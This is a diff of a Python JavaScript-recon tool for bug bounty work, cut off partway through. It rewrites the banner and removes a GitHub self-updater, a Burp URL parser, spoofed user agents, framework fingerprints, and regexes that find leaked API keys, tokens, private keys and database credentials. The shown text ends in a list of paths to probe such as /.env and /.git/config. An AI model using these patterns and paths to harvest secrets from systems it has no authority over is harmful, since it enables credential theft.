@@ -2,25 +2,21 @@
 # -*- coding: utf-8 -*-
 
 # ╔══════════════════════════════════════════════════════════════════════╗
-# ║                         JSReaper v2.1                               ║
-# ║         JavaScript Recon & Analysis Tool for Security Research             ║
+# ║                         JSReaper v3.0                               ║
+# ║         JavaScript Security Analysis Tool                           ║
 # ║                                                                      ║
 # ║  Written by @dr34lm                                                  ║
-# ║  Twitter/X: https://x.com/dr34lm                                    ║
+# ║  https://x.com/dr34lm                                               ║
 # ║                                                                      ║
-# ║  Built for security researchers, educators, and bug bounty hunters.          ║
-# ║  For educational and research purposes only.                         ║
-# ║  Use only on targets you are authorized to test.                     ║
+# ║  Focused on finding real security issues in JS files:               ║
+# ║    1. Exposed endpoints (with live HTTP status check)               ║
+# ║    2. SQL injection parameters                                       ║
+# ║    3. Path traversal / LFI indicators                               ║
+# ║    4. Remote Code Execution indicators                               ║
+# ║    5. Information disclosure (secrets, keys, tokens)                ║
+# ║                                                                      ║
+# ║  For educational and authorized research use only.                  ║
 # ╚══════════════════════════════════════════════════════════════════════╝
-#
-# CHANGELOG:
-#   v1.0 - initial release
-#   v1.1 - HTTP/HTTPS auto-fallback, lemon banner, rich coloring, cross-platform
-#   v2.0 - Burp Suite JS input parsing, version checker, status probe,
-#           dynamic terminal layout, cross-file correlation engine,
-#           tech fingerprinting + CVE lookup, cleaner findings per domain
-#   v2.1 - self-updater (--update), false positive reduction engine,
-#           false negative reduction engine, confidence scoring per finding
 
 import argparse
 import sys
@@ -34,20 +30,20 @@ import datetime
 import platform
 import shutil
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, urlencode
 from collections import defaultdict
 import threading
 
-TOOL_VERSION = "2.6"
-TOOL_NAME    = "JSReaper"
-
-# GitHub URLs used by --version and --update
+TOOL_VERSION       = "3.0"
+TOOL_NAME          = "JSReaper"
 LATEST_VERSION_URL = "https://raw.githubusercontent.com/dr34lm/jsreaper/main/VERSION"
 LATEST_SCRIPT_URL  = "https://raw.githubusercontent.com/dr34lm/jsreaper/main/jsreaper.py"
 
 IS_WINDOWS = platform.system() == "Windows"
-IS_MACOS   = platform.system() == "Darwin"
-IS_LINUX   = platform.system() == "Linux"
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  DEPENDENCIES
+# ─────────────────────────────────────────────────────────────────────────────
 
 try:
     import requests
@@ -55,1590 +51,441 @@ try:
     from colorama import init, Fore, Back, Style
     init(autoreset=True, convert=IS_WINDOWS, strip=False)
 except ImportError as e:
-    print(f"[!] Missing dependency: {e}")
-    print("[*] pip3 install requests beautifulsoup4 colorama jsbeautifier tqdm urllib3")
+    print(f"[!] Missing: {e}")
+    print("[*] pip3 install requests beautifulsoup4 colorama urllib3")
     sys.exit(1)
 
 try:
     import jsbeautifier
-    JS_BEAUTIFIER = True
+    HAS_BEAUTIFIER = True
 except ImportError:
-    JS_BEAUTIFIER = False
+    HAS_BEAUTIFIER = False
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  COLOR SYSTEM
-# ═════════════════════════════════════════════════════════════════════════════
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-LEMON = "\033[38;5;154m"
-LIME  = "\033[38;5;118m"
-MINT  = "\033[38;5;121m"
-GOLD  = "\033[38;5;220m"
-GRAY  = "\033[38;5;245m"
-RESET = Style.RESET_ALL
+# ─────────────────────────────────────────────────────────────────────────────
+#  COLORS
+# ─────────────────────────────────────────────────────────────────────────────
 
-C_CRITICAL = "\033[48;5;196m\033[38;5;231m"
-C_HIGH     = "\033[48;5;202m\033[38;5;231m"
-C_MEDIUM   = "\033[48;5;220m\033[38;5;232m"
-C_LOW      = "\033[48;5;33m\033[38;5;231m"
-C_INFO     = "\033[48;5;238m\033[38;5;252m"
+RESET    = Style.RESET_ALL
+WHITE    = "\033[38;5;231m"
+DIM      = "\033[38;5;242m"
+RED      = "\033[38;5;196m"
+ORANGE   = "\033[38;5;208m"
+YELLOW   = "\033[38;5;220m"
+BLUE     = "\033[38;5;75m"
+GREEN    = "\033[38;5;154m"
+CYAN     = "\033[38;5;117m"
+PURPLE   = "\033[38;5;213m"
 
-FG_CRITICAL = "\033[38;5;196m"
-FG_HIGH     = "\033[38;5;208m"
-FG_MEDIUM   = "\033[38;5;220m"
-FG_LOW      = "\033[38;5;75m"
-FG_INFO     = "\033[38;5;252m"
-FG_SUCCESS  = "\033[38;5;154m"
-FG_LABEL    = "\033[38;5;213m"
-FG_URL      = "\033[38;5;117m"
-FG_RELATION = "\033[38;5;147m"
-FG_SECTION  = "\033[38;5;226m"
-FG_DIM      = "\033[38;5;242m"
-FG_WAF      = "\033[38;5;203m"
-FG_PROBE    = "\033[38;5;208m"
-FG_SUB      = "\033[38;5;120m"
-FG_TECH     = "\033[38;5;159m"
-FG_CORR     = "\033[38;5;219m"
+BG_RED    = "\033[48;5;196m\033[38;5;231m"
+BG_ORANGE = "\033[48;5;202m\033[38;5;231m"
+BG_YELLOW = "\033[48;5;220m\033[38;5;232m"
+BG_BLUE   = "\033[48;5;33m\033[38;5;231m"
+BG_GRAY   = "\033[48;5;238m\033[38;5;252m"
 
-# HTTP status code colors
-STATUS_COLORS = {
-    200: "\033[38;5;154m",   # green  — alive
-    201: "\033[38;5;154m",
-    204: "\033[38;5;154m",
-    301: "\033[38;5;220m",   # gold   — redirect
-    302: "\033[38;5;220m",
-    304: "\033[38;5;245m",   # gray   — not modified
-    400: "\033[38;5;208m",   # orange — bad request
-    401: "\033[38;5;208m",   # orange — unauthorized
-    403: "\033[38;5;208m",   # orange — forbidden (exists!)
-    404: "\033[38;5;242m",   # dim    — not found
-    429: "\033[38;5;203m",   # red    — rate limited (WAF?)
-    500: "\033[38;5;196m",   # red    — server error
-    502: "\033[38;5;196m",
-    503: "\033[38;5;203m",
+SEV_COLOR = {
+    "critical": RED,
+    "high":     ORANGE,
+    "medium":   YELLOW,
+    "low":      BLUE,
+    "info":     DIM,
 }
 
-STATUS_ICONS = {
-    200: "●", 201: "●", 204: "●",
-    301: "→", 302: "→", 304: "○",
-    400: "✗", 401: "🔒", 403: "🔒",
-    404: "✗",
-    429: "⚡", 500: "💥", 502: "💥", 503: "⚡",
+SEV_BADGE = {
+    "critical": BG_RED,
+    "high":     BG_ORANGE,
+    "medium":   BG_YELLOW,
+    "low":      BG_BLUE,
+    "info":     BG_GRAY,
 }
 
-SEVERITY_FG    = {"critical": FG_CRITICAL, "high": FG_HIGH,
-                  "medium":   FG_MEDIUM,   "low":  FG_LOW, "info": FG_INFO}
-SEVERITY_BADGE = {"critical": C_CRITICAL,  "high": C_HIGH,
-                  "medium":   C_MEDIUM,    "low":  C_LOW,  "info": C_INFO}
-SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
-SEVERITY_ICONS = {"critical": "💀", "high": "🔴", "medium": "🟡", "low": "🔵", "info": "⚪"}
+SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
 
-if IS_WINDOWS and "WT_SESSION" not in os.environ:
-    SEVERITY_ICONS = {"critical":"[!!!]","high":"[!! ]","medium":"[!  ]","low":"[-  ]","info":"[.  ]"}
-    STATUS_ICONS   = defaultdict(lambda: "[?]", {200:"[OK]",301:"[->]",302:"[->]",403:"[FX]",404:"[  ]",500:"[ER]"})
-
-CATEGORY_COLORS = {
-    "API Keys & Tokens":           "\033[38;5;213m",
-    "AWS Credentials":             "\033[38;5;196m",
-    "Authentication & Passwords":  "\033[38;5;203m",
-    "OAuth & SSO":                 "\033[38;5;219m",
-    "Database Credentials":        "\033[38;5;208m",
-    "Cloud & Infrastructure":      "\033[38;5;117m",
-    "Sensitive Endpoints & Paths": "\033[38;5;226m",
-    "OWASP / Security Issues":     "\033[38;5;203m",
-    "High-Impact Indicators":      "\033[38;5;196m",
-    "Internal Infrastructure":     "\033[38;5;147m",
-    "Hardcoded Usernames":         "\033[38;5;220m",
-    "Crypto & Hashing":            "\033[38;5;75m",
-    "URLs & Subdomains":           "\033[38;5;120m",
-    "Version Control & Debug":     "\033[38;5;245m",
+STATUS_COLOR = {
+    200: GREEN, 201: GREEN, 204: GREEN,
+    301: YELLOW, 302: YELLOW, 307: YELLOW, 308: YELLOW,
+    400: ORANGE, 401: ORANGE, 403: ORANGE,
+    404: DIM,
+    500: RED, 502: RED, 503: ORANGE,
 }
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  DYNAMIC TERMINAL WIDTH
-#  Layout adapts to however wide or narrow the user's terminal is.
-#  Min 60, max 120 — anything outside that range looks bad.
-# ═════════════════════════════════════════════════════════════════════════════
+# ─────────────────────────────────────────────────────────────────────────────
+#  BANNER
+# ─────────────────────────────────────────────────────────────────────────────
 
-def term_width():
-    """get current terminal width, clamped to sane bounds"""
-    try:
-        w = shutil.get_terminal_size(fallback=(100, 40)).columns
-        return max(60, min(w, 120))
-    except Exception:
-        return 100
-
-def divider(char="─", color=FG_DIM):
-    return f"{color}{char * term_width()}{RESET}"
-
-def section_header(title, color=FG_SECTION):
-    w   = term_width()
-    pad = max(0, (w - len(title) - 4) // 2)
-    with print_lock:
-        print(f"\n{color}{'═' * w}")
-        print(f"{'═' * pad}  {title}  {'═' * max(0, w - pad - len(title) - 4)}")
-        print(f"{'═' * w}{RESET}")
-
-def box_line(text, color=FG_DIM):
-    """truncate a line to terminal width so it never wraps"""
-    w = term_width() - 4
-    if len(text) > w:
-        text = text[:w-3] + "..."
-    return f"{color}{text}{RESET}"
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  BANNER  v2.1
-#  Thin elegant line-art — uses / \ _ | chars like the classic figlet style.
-#  Gradient: lemon → lime → mint top to bottom.
-# ═════════════════════════════════════════════════════════════════════════════
-
-def get_banner():
-    # Clean white/colorless upright block-style banner.
-    # Uses only bright white — clean, professional, readable on any terminal.
-    WHITE = "\033[38;5;231m"   # pure bright white
-    DIM   = "\033[38;5;245m"   # subtle gray for subtitle lines
+def banner():
     v = TOOL_VERSION
-    rows = [
-        "      ######    #####    ######    #######    ####    ######    #######   ######   ",
-        "        ##     ##       ##   ##    ##        ##  ##   ##   ##   ##        ##   ##  ",
-        "        ##      ####    ##   ##    #####    ##    ##  ##   ##   #####     ##   ##  ",
-        "        ##          ##  ######     ##       ########  ######    ##        ######   ",
-        "   ##   ##          ##  ## ##      ##       ##    ##  ##        ##        ## ##    ",
-        "    #####       ####    ##  ##     #######  ##    ##  ##        #######   ##  ##   ",
-    ]
-    out = "\n"
-    for row in rows:
-        out += WHITE + row + RESET + "\n"
-    out += "\n"
-    out += WHITE + "          ⚡  JavaScript Recon & Analysis Tool  v" + v + "\n"
-    out += DIM   + "          ◈   Linux | macOS | Windows  —  Python 3.7+" + "\n"
-    out += DIM   + "          ✦   Written by @dr34lm  |  Research & Educational Use Only" + "\n"
-    out += RESET
-    return out
+    return f"""
+{WHITE}      ######    #####    ######    #######    ####    ######    #######   ######
+{WHITE}        ##     ##       ##   ##    ##        ##  ##   ##   ##   ##        ##   ##
+{WHITE}        ##      ####    ##   ##    #####    ##    ##  ##   ##   #####     ##   ##
+{WHITE}        ##          ##  ######     ##       ########  ######    ##        ######
+{WHITE}   ##   ##          ##  ## ##      ##       ##    ##  ##        ##        ## ##
+{WHITE}    #####       ####    ##  ##     #######  ##    ##  ##        #######   ##  ##
+{DIM}
+{DIM}          JS Security Analysis Tool  v{v}  |  @dr34lm
+{DIM}          Endpoints · SQL · Path Traversal · RCE · Info Disclosure
+{RESET}"""
 
-def check_version():
-    """
-    Compare local version against GitHub. Tells the user if they're
-    running the latest version or if an update is available.
-    """
-    print(f"\n{FG_SECTION}[~] Checking version...{RESET}")
-    print(f"    {FG_DIM}Tool   :{RESET} {FG_SUCCESS}{TOOL_NAME}{RESET}")
-    print(f"    {FG_DIM}Version:{RESET} {FG_SUCCESS}v{TOOL_VERSION}{RESET}")
-    print(f"    {FG_DIM}Author :{RESET} {FG_URL}@dr34lm  —  https://x.com/dr34lm{RESET}")
-    print(f"    {FG_DIM}Purpose:{RESET} Security research & educational use")
-    print(f"    {FG_DIM}OS     :{RESET} {platform.system()} {platform.release()}")
-    print(f"    {FG_DIM}Python :{RESET} {platform.python_version()}")
-
-    try:
-        resp = requests.get(LATEST_VERSION_URL, timeout=5)
-        if resp.status_code == 200:
-            latest = resp.text.strip()
-            if latest == TOOL_VERSION:
-                print(f"    {FG_DIM}Status :{RESET} {FG_SUCCESS}✓ Up to date (v{TOOL_VERSION} is latest){RESET}")
-            else:
-                print(f"    {FG_DIM}Status :{RESET} {FG_MEDIUM}⚠ Update available: v{latest}  (you have v{TOOL_VERSION}){RESET}")
-                print(f"    {FG_DIM}Update :{RESET} {FG_URL}Run:  jsreaper --update{RESET}")
-        else:
-            print(f"    {FG_DIM}Status :{RESET} {FG_DIM}Could not check — running v{TOOL_VERSION}{RESET}")
-    except Exception:
-        print(f"    {FG_DIM}Status :{RESET} {FG_DIM}Offline — running v{TOOL_VERSION}{RESET}")
-    print()
-
-
-def self_update():
-    """
-    --update flag: pull the latest jsreaper.py from GitHub and replace
-    the currently running script with it.
-
-    Steps:
-      1. Check the VERSION file on GitHub
-      2. If newer: download the new jsreaper.py
-      3. Back up the current script as jsreaper.py.bak
-      4. Replace the running script
-      5. Fix permissions and confirm
-
-    Works on Linux, macOS, and Windows.
-    Cross-platform: uses the path of the currently running script
-    so it works whether installed in /usr/local/bin, ~/bin, or anywhere.
-    """
-    section_header("SELF-UPDATE", FG_SECTION)
-    info(f"Current version : v{TOOL_VERSION}")
-    info("Checking GitHub for latest version...")
-
-    try:
-        # step 1 — check latest version number
-        ver_resp = requests.get(LATEST_VERSION_URL, timeout=10)
-        if ver_resp.status_code != 200:
-            error("Could not reach GitHub to check version. Are you online?")
-            sys.exit(1)
-
-        latest = ver_resp.text.strip()
-        info(f"Latest version  : v{latest}")
-
-        if latest == TOOL_VERSION:
-            print(f"\n{FG_SUCCESS}  ✓ You are already running the latest version (v{TOOL_VERSION}).{RESET}")
-            print(f"  {FG_DIM}No update needed.{RESET}\n")
-            return
-
-        # step 2 — newer version available, ask for confirmation
-        print(f"\n  {FG_MEDIUM}⚡ Update available: v{TOOL_VERSION} → v{latest}{RESET}")
-        print(f"  {FG_DIM}Source: {LATEST_SCRIPT_URL}{RESET}")
-
-        try:
-            answer = input(f"\n{FG_SECTION}  Proceed with update? [y/N]: {RESET}").strip().lower()
-        except (KeyboardInterrupt, EOFError):
-            print()
-            warn("Update cancelled.")
-            return
-
-        if answer not in ["y", "yes"]:
-            warn("Update cancelled by user.")
-            return
-
-        # step 3 — download the new script
-        info("Downloading latest jsreaper.py from GitHub...")
-        script_resp = requests.get(LATEST_SCRIPT_URL, timeout=30)
-        if script_resp.status_code != 200:
-            error(f"Download failed — HTTP {script_resp.status_code}")
-            sys.exit(1)
-
-        new_content = script_resp.text
-        if len(new_content) < 1000:
-            # sanity check — real script is always > 1000 chars
-            error("Downloaded file looks too small — aborting for safety.")
-            sys.exit(1)
-
-        if "def main():" not in new_content:
-            # make sure we got an actual Python script, not an error page
-            error("Downloaded content doesn't look like a valid script — aborting.")
-            sys.exit(1)
-
-        # step 4 — find where THIS script is currently installed
-        script_path = os.path.realpath(sys.argv[0])
-        backup_path = script_path + ".bak"
-
-        info(f"Script location : {script_path}")
-
-        # step 5 — back up current version
-        try:
-            import shutil as _shutil
-            _shutil.copy2(script_path, backup_path)
-            success(f"Backup saved    : {backup_path}")
-        except Exception as e:
-            warn(f"Could not create backup: {e} — continuing anyway")
-
-        # step 6 — write the new version
-        try:
-            with open(script_path, "w", encoding="utf-8") as f:
-                f.write(new_content)
-        except PermissionError:
-            # on Linux/Mac if installed with sudo, we need elevated write
-            error(f"Permission denied writing to {script_path}")
-            error("Try:  sudo jsreaper --update")
-            sys.exit(1)
-
-        # step 7 — fix permissions (important on Linux/Mac)
-        try:
-            os.chmod(script_path, 0o755)
-        except Exception:
-            pass  # windows doesn't need this
-
-        print(f"\n{FG_SUCCESS}  ✓ JSReaper updated successfully!{RESET}")
-        print(f"  {FG_SUCCESS}  v{TOOL_VERSION} → v{latest}{RESET}")
-        print(f"  {FG_DIM}  Backup of old version: {backup_path}{RESET}")
-        print(f"  {FG_DIM}  Run  jsreaper --version  to confirm.{RESET}\n")
-
-    except requests.exceptions.ConnectionError:
-        error("No internet connection. Cannot check for updates.")
-        sys.exit(1)
-    except Exception as e:
-        error(f"Update failed: {e}")
-        sys.exit(1)
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  BURP SUITE JS INPUT PARSER
-#  Handles all the messy ways Burp Suite exports JS file lists:
-#    - one URL per line
-#    - all on one line (no separator)
-#    - comma separated
-#    - space separated
-#    - mixed
-# ═════════════════════════════════════════════════════════════════════════════
-
-def parse_burp_js_input(raw_text):
-    """
-    Parse JS URLs from Burp Suite copy-paste in any format.
-    Burp sometimes gives you one per line, sometimes all on one line,
-    sometimes comma-separated. This handles all of it.
-
-    Returns a clean deduplicated list of URLs.
-    """
-    # step 1: split on common delimiters — newline, comma, space, pipe
-    # but we need to be careful not to break URLs themselves
-    raw = raw_text.strip()
-
-    # if it looks like everything is on one line with no separator,
-    # split on 'https://' boundaries (keeping the prefix)
-    if "\n" not in raw and "," not in raw:
-        # split on https:// or http:// boundaries
-        parts = re.split(r'(?=https?://)', raw)
-    else:
-        # split on newlines and commas first
-        parts = re.split(r'[\n,]+', raw)
-
-    urls = []
-    for part in parts:
-        part = part.strip().strip(',').strip()
-        # extract any URL-like strings from each part
-        found = re.findall(r'https?://[^\s,\'"<>\n]+', part)
-        urls.extend(found)
-
-    # deduplicate while preserving order
-    seen = set()
-    clean = []
-    for u in urls:
-        u = u.strip().rstrip('/')
-        if u and u not in seen:
-            seen.add(u)
-            clean.append(u)
-
-    return clean
-
-
-def parse_burp_file(filepath):
-    """Read a Burp-exported JS file list from disk and parse it."""
-    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
-        return parse_burp_js_input(f.read())
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  USER AGENTS
-# ═════════════════════════════════════════════════════════════════════════════
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-]
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  TECHNOLOGY FINGERPRINTS
-#  Detect what stack a target is running — then check for known CVEs.
-# ═════════════════════════════════════════════════════════════════════════════
-
-TECH_FINGERPRINTS = {
-    "React":          [r'react(?:\.min)?\.js', r'__REACT_DEVTOOLS', r'React\.createElement'],
-    "Vue.js":         [r'vue(?:\.min)?\.js', r'__vue__', r'Vue\.component'],
-    "Angular":        [r'angular(?:\.min)?\.js', r'ng-version', r'@angular/core'],
-    "jQuery":         [r'jquery(?:\.min)?\.js', r'jQuery\.fn\.jquery', r'\$\.ajax'],
-    "Next.js":        [r'_next/static', r'__NEXT_DATA__', r'next/router'],
-    "Nuxt.js":        [r'_nuxt/', r'__NUXT__'],
-    "WordPress":      [r'wp-content', r'wp-includes', r'wp-json'],
-    "Laravel":        [r'laravel', r'csrf-token', r'X-CSRF-TOKEN'],
-    "Django":         [r'csrfmiddlewaretoken', r'django'],
-    "Express.js":     [r'express', r'X-Powered-By.*Express'],
-    "GraphQL":        [r'graphql', r'__typename', r'apolloClient'],
-    "Webpack":        [r'webpackJsonp', r'__webpack_require__', r'webpack/runtime'],
-    "AWS SDK":        [r'aws-sdk', r'AWS\.config', r'amazonaws\.com'],
-    "Firebase":       [r'firebase', r'firebaseapp\.com', r'initializeApp'],
-    "Stripe":         [r'stripe\.js', r'Stripe\(', r'stripe\.com'],
-    "Sentry":         [r'sentry\.io', r'Sentry\.init', r'@sentry/'],
-    "Axios":          [r'axios(?:\.min)?\.js', r'axios\.get\(', r'axios\.post\('],
-    "Socket.io":      [r'socket\.io', r'io\.connect\('],
-}
-
-# Known vulnerable version patterns — basic static check
-# Maps tech name → regex to extract version string
-VERSION_PATTERNS = {
-    "jQuery":  r'jquery[/-]v?(\d+\.\d+\.?\d*)',
-    "React":   r'react[/-]v?(\d+\.\d+\.?\d*)',
-    "Angular": r'angular[/-]v?(\d+\.\d+\.?\d*)',
-    "Vue.js":  r'vue[/-]v?(\d+\.\d+\.?\d*)',
-}
-
-# Known risky old versions (simplified — for flagging only, not exploitation)
-RISKY_VERSIONS = {
-    "jQuery":  {"<1.12.0": "XSS via $.html() — CVE-2015-9251",
-                "<3.5.0":  "XSS via jQuery.htmlPrefilter — CVE-2020-11022"},
-    "Angular": {"<1.6.0":  "sandbox escape / XSS — multiple CVEs"},
-}
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  SENSITIVE PATTERNS  (expanded with high-impact indicators)
-# ═════════════════════════════════════════════════════════════════════════════
-
-SENSITIVE_PATTERNS = {
-
-    # ── REAL SECRETS — these have unique formats, near-zero false positives ──
-    # Every pattern here requires a specific credential FORMAT, not just a word.
-
-    "AWS Credentials": [
-        # AKIA format is globally unique — if you see this it IS an AWS key
-        (r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}', "critical"),
-        # Secret key needs BOTH the variable name AND a 40-char base64 value
-        (r'aws[_\-]?secret[_\-]?access[_\-]?key\s*[=:]\s*["\']([A-Za-z0-9/+=]{40})["\']', "critical"),
-        # MWS token has a very specific UUID-like format
-        (r'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "critical"),
-    ],
-
-    "Payment & Commerce Keys": [
-        # Stripe — sk_live_ prefix is unique and only appears in real secret keys
-        (r'sk_live_[0-9a-zA-Z]{24,}',                                  "critical"),
-        (r'rk_live_[0-9a-zA-Z]{24,}',                                  "critical"),
-        # pk_live_ is the publishable key — less critical but still real
-        (r'pk_live_[0-9a-zA-Z]{24,}',                                  "high"),
-        # Braintree — very specific format
-        (r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',     "critical"),
-        # Square — sq0csp prefix is unique
-        (r'sq0csp-[0-9A-Za-z\-_]{43}',                                 "critical"),
-    ],
-
-    "Communication & Messaging Keys": [
-        # SendGrid — SG. prefix + exactly 69 chars
-        (r'SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}',               "critical"),
-        # Twilio — SK prefix + 32 hex chars
-        (r'SK[0-9a-fA-F]{32}',                                          "high"),
-        # Slack webhook — very specific URL format
-        (r'https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}', "critical"),
-        # Slack token — xox prefix
-        (r'xox[baprs]-[0-9]{12}-[0-9A-Za-z\-]{10,}',                  "critical"),
-    ],
-
-    "Source Control & CI Keys": [
-        # GitHub — these prefixes are unique and not found in any other context
-        (r'ghp_[A-Za-z0-9]{36,}',                                      "critical"),
-        (r'gho_[A-Za-z0-9]{36,}',                                      "critical"),
-        (r'ghu_[A-Za-z0-9]{36,}',                                      "critical"),
-        (r'ghs_[A-Za-z0-9]{36,}',                                      "critical"),
-        (r'github_pat_[A-Za-z0-9_]{82,}',                              "critical"),
-        # NPM token
-        (r'npm_[A-Za-z0-9]{36,}',                                      "critical"),
-    ],
-
-    "Cloud Platform Keys": [
-        # Google API key — AIza prefix is unique
-        (r'AIza[0-9A-Za-z\-_]{35}',                                     "critical"),
-        # Google OAuth token
-        (r'ya29\.[0-9A-Za-z\-_]{40,}',                                  "critical"),
-        # GCP service account
-        (r'"type"\s*:\s*"service_account"',                              "critical"),
-        # Firebase config block — contains real project credentials
-        (r'firebaseConfig\s*=\s*\{[^}]{30,}\}',                         "high"),
-        # Shopify tokens
-        (r'shpat_[A-Za-z0-9]{32}',                                      "critical"),
-        (r'shppa_[A-Za-z0-9]{32}',                                      "critical"),
-        # OpenAI / Anthropic
-        (r'sk-[A-Za-z0-9]{48}',                                         "critical"),
-        (r'sk-ant-[A-Za-z0-9_\-]{93,}',                                 "critical"),
-    ],
-
-    "Private Keys & Certificates": [
-        # PEM blocks — always real, format is globally unique
-        (r'-----BEGIN RSA PRIVATE KEY-----',                             "critical"),
-        (r'-----BEGIN EC PRIVATE KEY-----',                              "critical"),
-        (r'-----BEGIN OPENSSH PRIVATE KEY-----',                        "critical"),
-        (r'-----BEGIN PGP PRIVATE KEY BLOCK-----',                      "critical"),
-        (r'-----BEGIN DSA PRIVATE KEY-----',                             "critical"),
-    ],
-
-    "Auth Tokens (Format-Verified)": [
-        # JWT — three base64 parts separated by dots, starts with eyJ
-        # This format is globally unique — it IS a JWT if it matches
-        (r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9._\-]{10,}\.[A-Za-z0-9_\-]{10,}', "high"),
-        # Bearer token hardcoded inline in code (not from env var)
-        (r'Authorization["\']?\s*:\s*["\']Bearer\s+([A-Za-z0-9_\-\.]{40,})["\']', "high"),
-        # Basic auth hardcoded (base64 of user:pass)
-        (r'Authorization["\']?\s*:\s*["\']Basic\s+([A-Za-z0-9+/=]{20,})["\']', "high"),
-        # URL with credentials embedded — user:pass@host
-        (r'https?://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{6,}@[A-Za-z0-9\-\.]+\.[a-z]{2,}', "critical"),
-    ],
-
-    "Database Connection Strings": [
-        # Full connection URLs with credentials — these are always real
-        (r'mongodb(\+srv)?://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{4,}@[^\s"\'<]{8,}', "critical"),
-        (r'mysql://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{4,}@[^\s"\'<]{8,}',           "critical"),
-        (r'postgresql://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{4,}@[^\s"\'<]{8,}',      "critical"),
-        (r'redis://:[A-Za-z0-9_\-\.!@#$%]{6,}@[^\s"\'<]{8,}',                             "high"),
-        # DB password explicitly assigned a non-empty value
-        (r'db[_\-]?pass(?:word)?\s*[=:]\s*["\']([^"\']{8,})["\']',                        "high"),
-    ],
-
-    "Hardcoded Credentials (High Confidence)": [
-        # These require BOTH the variable name AND a high-entropy value
-        # Short/placeholder values are filtered by the confidence engine
-        (r'password\s*[=:]\s*["\']([^"\']{8,})["\']',                  "high"),
-        (r'passwd\s*[=:]\s*["\']([^"\']{8,})["\']',                    "high"),
-        (r'client[_\-]?secret\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{20,})["\']', "critical"),
-        (r'jwt[_\-]?secret\s*[=:]\s*["\']([^"\']{12,})["\']',          "critical"),
-    ],
-
-    "Source Maps (Info Disclosure)": [
-        # Source map files referenced in JS — if accessible = full source exposed
-        # This is a REAL finding unlike most pattern matches
-        (r'//[#@]\s*sourceMappingURL=(\S+\.map)',                        "medium"),
-    ],
-
-    "Internal Network Exposure": [
-        # Private IP addresses hardcoded — real finding in any context
-        (r'https?://(?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+', "medium"),
-        (r'["\'](?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+["\']', "medium"),
-    ],
-
-    "XSS Sinks with User Input": [
-        # innerHTML only flagged when user-controlled data flows into it
-        (r'innerHTML\s*=\s*[^"\';\n]{0,60}(?:location\.(?:search|hash)|URLSearchParams|req\.|param|query|input)', "high"),
-        # document.write with user input
-        (r'document\.write\s*\([^)]{0,60}(?:location\.|param|query|input)', "high"),
-        # CORS wildcard — actual misconfiguration
-        (r'Access-Control-Allow-Origin["\'\s:]+\*',                      "medium"),
-    ],
-}
-
-
-INTERESTING_EXTENSIONS = [
-    ".js", ".mjs", ".jsx", ".ts", ".tsx",
-    ".json", ".config.js", ".env",
-    ".xml", ".yaml", ".yml", ".toml",
-    ".php", ".py", ".rb", ".asp", ".aspx",
-    ".sql", ".db", ".bak", ".backup", ".old", ".tmp",
-    ".log", ".txt", ".map", ".wasm",
-]
-
-WAF_SIGNATURES = {
-    "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid"],
-    "Akamai":      ["akamai", "x-check-cacheable"],
-    "AWS WAF":     ["awswaf", "x-amzn-requestid", "x-amz-cf-id"],
-    "Sucuri":      ["sucuri", "x-sucuri-id"],
-    "Imperva":     ["imperva", "incap_ses", "visid_incap"],
-    "F5 BIG-IP":   ["bigip", "x-cnection"],
-    "ModSecurity": ["mod_security", "modsecurity"],
-}
-
-COMMON_SENSITIVE_PATHS = [
-    "/.env", "/.env.local", "/.env.production", "/.env.backup",
-    "/.git/config", "/.git/HEAD",
